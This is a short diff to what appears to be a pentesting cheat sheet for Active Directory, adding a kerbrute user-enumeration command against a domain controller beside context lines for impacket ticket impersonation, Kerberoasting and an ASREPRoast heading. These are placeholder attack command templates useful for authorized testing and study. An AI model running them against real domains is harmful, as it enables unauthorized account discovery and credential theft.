@@ -117,6 +117,9 @@ impacket-getST -spn 'SPN' -impersonate 'USERNAME' -ts -dc-ip 'IP' 'DOMAIN/USERNA
 ```
 - impacket-GetUserSPNs
 - kerbrute ![GitHub Repo stars](https://img.shields.io/github/stars/ropnop/kerbrute?style=social)
+```sh
+./kerbrute_linux_amd64 userenum --dc 'IP' -d 'DOMAIN' 'USERLIST'      
+```
 - netexec
 ```sh
 # ASREPRoast (TCP389番も必要)
